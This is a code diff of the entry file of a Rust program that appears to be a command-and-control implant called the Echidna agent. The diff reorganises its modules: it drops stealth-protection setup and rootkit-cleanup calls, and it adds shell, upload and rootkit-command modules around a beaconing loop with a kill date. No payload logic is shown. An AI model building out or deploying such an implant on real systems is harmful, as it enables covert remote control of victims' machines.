@@ -6,16 +6,16 @@ use crate::agent::calculate_sleep_time;
 use crate::agent::EchidnaAgent;
 
 mod agent;
-mod bridge;
 mod payloadvars;
 mod profiles;
-mod rootkit;
-mod stealth;
 mod tasking;
 mod utils;
+mod shell;
+mod upload;
+mod rootkit_commands;
+
 
 // Echidna-specific rootkit commands and minimal system control
-mod commands;
 mod exit;
 mod jobs;
 mod sleep;
@@ -24,9 +24,6 @@ mod workinghours;
 /// Real entrypoint of the program.
 /// Checks to see if the agent should daemonize and then runs the main beaconing code.
 pub fn real_main() -> Result<(), Box<dyn Error>> {
-    // Initialize stealth measures early
-    stealth::initialize_protection()?;
-
     if let Some(daemonize) = option_env!("daemonize") {
         if daemonize.eq_ignore_ascii_case("true") {
             // Fork the process if daemonize is set to "true"
@@ -79,10 +76,6 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Check if the agent has passed the kill date
         if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
-            // Clean up any active rootkit techniques before exiting
-            if let Err(e) = agent.cleanup_rootkit() {
-                eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
-            }
             return Ok(());
         }
 
@@ -136,10 +129,6 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 
         // Break out of the loop if the agent should exit
         if agent.shared.exit_agent {
-            // Clean up any active rootkit techniques before exiting
-            if let Err(e) = agent.cleanup_rootkit() {
-                eprintln!("Warning: Failed to clean up rootkit techniques: {}", e);
-            }
             break;
         }
 
